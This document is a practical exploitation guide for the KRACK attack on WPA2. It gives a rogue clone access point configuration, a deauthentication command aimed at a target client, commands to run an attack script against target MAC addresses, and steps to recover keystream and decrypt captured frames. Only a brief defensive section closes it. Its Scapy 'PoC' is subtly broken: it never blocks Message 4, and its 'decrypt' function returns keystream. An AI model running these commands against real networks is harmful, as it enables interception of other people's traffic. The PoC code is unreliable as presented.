# 09 — KRACK Attack (Practical Exploitation)

## Overview

KRACK (Key Reinstallation Attack, CVE-2017-13077/13078) exploits the WPA2 4-way handshake by manipulating and replaying handshake messages to force nonce reuse. When the AP retransmits Message 3 (because it didn't receive Message 4), the attacker blocks Message 4 and forwards the retransmitted Message 3 to the client. The client reinstalls the PTK, resetting the nonce and replay counter to 0.

## Attack Prerequisites

- Client must be connected to target AP (or attacker must force reconnection)
- Man-in-the-middle position between client and AP (channel-based MitM)
- Monitor mode + frame injection capable adapter
- Python 3 + Scapy

## Channel-Based Man-in-the-Middle Setup

The attacker creates a clone AP on a different channel. The client connects to the clone, and the clone forwards to the real AP.

```bash
# Step 1: Clone target AP on different channel
# Terminal 1: Create rogue AP (clone)
cat > /tmp/krack_ap.conf << EOF
interface=wlan1
ssid=TargetNetwork
channel=1
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_passphrase=FakePSK123
EOF
hostapd /tmp/krack_ap.conf

# Step 2: Deauth client from real AP (ch6) to force connect to clone (ch1)
aireplay-ng -0 5 -a <REAL_AP_MAC> -c <CLIENT_MAC> wlan0mon

# Step 3: Forward traffic between clone and real AP
# Requires two adapters: one for clone AP, one for real AP connection
```

## KRACK PoC (Python/Scapy)

```python
#!/usr/bin/env python3
"""KRACK attack PoC - nonce reset via Message 3 retransmission."""
from scapy.all import *
import sys, time

iface = sys.argv[1] if len(sys.argv) > 1 else "wlan0mon"
client_mac = sys.argv[2] if len(sys.argv) > 2 else "AA:BB:CC:DD:EE:FF"
ap_mac = sys.argv[3] if len(sys.argv) > 3 else "00:11:22:33:44:55"

def krack_mitm():
    print(f"[*] Starting KRACK MitM on {iface}")
    print(f"[*] Target: Client={client_mac} AP={ap_mac}")
    
    # Wait for 4-way handshake Message 3 from AP
    def handle_pkt(pkt):
        if pkt.haslayer(Dot11) and pkt.addr2 == ap_mac and pkt.addr1 == client_mac:
            if pkt.haslayer(EAPOL):
                eapol = bytes(pkt[EAPOL])
                # EAPOL-Key frame, Key Type = 1 (PTK), MIC present, Secure bit
                key_info = int.from_bytes(eapol[5:7], 'little')
                if key_info & 0x0008:  # Key Type = Pairwise
                    print("[+] Message 3 detected")
                    # Block Message 4 from client
                    return
    
    sniff(iface=iface, prn=handle_pkt, store=0)

# Real-world: Use vanhoefm/krackattacks-scripts
# git clone https://github.com/vanhoefm/krackattacks-scripts
# cd krackattacks-scripts/krackattack
# python3 krackattack.py -i wlan0mon -t <CLIENT_MAC> -a <AP_MAC> -c 6
```

## Using KRACK Scripts (Recommended)

```bash
# Clone Mathy Vanhoef's official KRACK scripts
git clone https://github.com/vanhoefm/krackattacks-scripts
cd krackattacks-scripts/krackattack

# Install dependencies
pip install -r requirements.txt

# Run the attack
# Requires two interfaces: one in monitor mode, one in managed
python3 krackattack.py \
    -i wlan0mon \
    -t AA:BB:CC:DD:EE:FF \
    -a 00:11:22:33:44:55 \
    -c 6 \
    --ap

# --ap: create rogue clone AP
# -c 6: target operates on channel 6
```

## Decrypting Traffic After Nonce Reset

Once nonce is reset to 0:
1. Capture encrypted data frames from the client
2. Use known plaintext attack: the first bytes of most protocols are predictable (TCP SYN = predictable IP/TCP headers, ARP = broadcast)
3. With nonce reset, the same keystream (TK + nonce=0) is reused
4. XOR captured ciphertext with known plaintext to derive keystream
5. Apply keystream to other frames with nonce=0

```python
# After capturing encrypted frames with nonce reset
def decrypt_with_nonce_reuse(ciphertext, known_plaintext):
    """XOR attack when nonce is reused (TK + nonce=0)."""
    keystream = bytes(a ^ b for a, b in zip(ciphertext, known_plaintext))
    return keystream

# First ARP request after nonce reset is broadcast: dst=ff:ff:ff:ff:ff:ff
# The LLC/SNAP header and ARP payload are predictable
```

## Defensive Application

- **Firmware patches**: All major vendors patched in 2017-2018. Unpatched devices remain vulnerable.
- **WPA3**: SAE handshake is not vulnerable to KRACK (different key derivation).
- **Nonce tracking**: Monitor EAPOL replay counters. Alert on counter reset after handshake.
- **802.11w (PMF)**: Does NOT prevent KRACK. KRACK attacks the data path, not management frames.

## References

- Vanhoef & Piessens, "Key Reinstallation Attacks: Forcing Nonce Reuse in WPA2," CCS 2017
- CVE-2017-13077, CVE-2017-13078, CVE-2017-13079, CVE-2017-13080, CVE-2017-13081, CVE-2017-13082
- https://www.krackattacks.com/
